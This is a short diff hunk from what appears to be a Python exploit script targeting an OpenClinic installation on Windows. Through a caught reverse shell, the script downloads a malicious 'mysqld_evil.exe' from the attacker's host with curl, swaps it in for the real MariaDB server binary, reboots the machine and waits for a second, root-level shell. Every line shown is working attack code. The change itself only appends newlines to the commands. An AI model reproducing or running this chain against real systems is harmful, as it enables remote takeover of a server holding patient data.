@@ -42,13 +42,13 @@ conn.send(bytes(cmd, 'utf8'))
 # compromise and privesc
 netcat = listen(LPORT)
 svr = netcat.wait_for_connection()
-cmd = f"curl http://{LHOST}:{PythonPORT}/mysqld.exe -o \"C:\projects\openclinic\mariadb\\bin\mysqld_evil.exe\""
+cmd = f"curl http://{LHOST}:{PythonPORT}/mysqld.exe -o \"C:\projects\openclinic\mariadb\\bin\mysqld_evil.exe\"\n"
 svr.send(bytes(cmd, "utf8"))
-svr.send(b"ren \"C:\projects\openclinic\mariadb\\bin\mysqld.exe\" \"mysqld.bak\"")
+svr.send(b"ren \"C:\projects\openclinic\mariadb\\bin\mysqld.exe\" \"mysqld.bak\"\n")
 print(svr.recv())
-svr.send(b"ren \"C:\projects\openclinic\mariadb\\bin\mysqld_evil.exe\" \"mysqld.exe\"")
+svr.send(b"ren \"C:\projects\openclinic\mariadb\\bin\mysqld_evil.exe\" \"mysqld.exe\"\n")
 print(svr.recv())
-svr.send(b"shutdown -r")
+svr.send(b"shutdown -r\n")
 
 # root
 netcat2 = listen(rootPort)
